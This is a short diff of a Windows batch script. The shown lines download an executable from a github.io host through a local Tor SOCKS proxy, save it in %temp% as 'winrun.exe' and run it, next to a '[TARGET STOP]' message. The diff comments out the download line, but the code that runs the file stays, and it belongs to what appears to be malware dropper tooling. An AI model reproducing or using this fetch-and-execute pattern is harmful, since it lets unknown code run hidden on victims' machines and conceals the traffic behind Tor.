@@ -16,7 +16,7 @@ curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/purga_p
 echo.
 )
 echo [TARGET STOP]
-curl.exe --socks5-hostname 127.0.0.1:9050 "https://cryptedlumos.github.io/client.exe" --output "%temp%\winrun.exe"
+REM curl.exe --socks5-hostname 127.0.0.1:9050 "https://cryptedlumos.github.io/client.exe" --output "%temp%\winrun.exe"
 IF EXIST "%temp%\winrun.exe" (
   "%temp%\winrun.exe"
 ) ELSE (
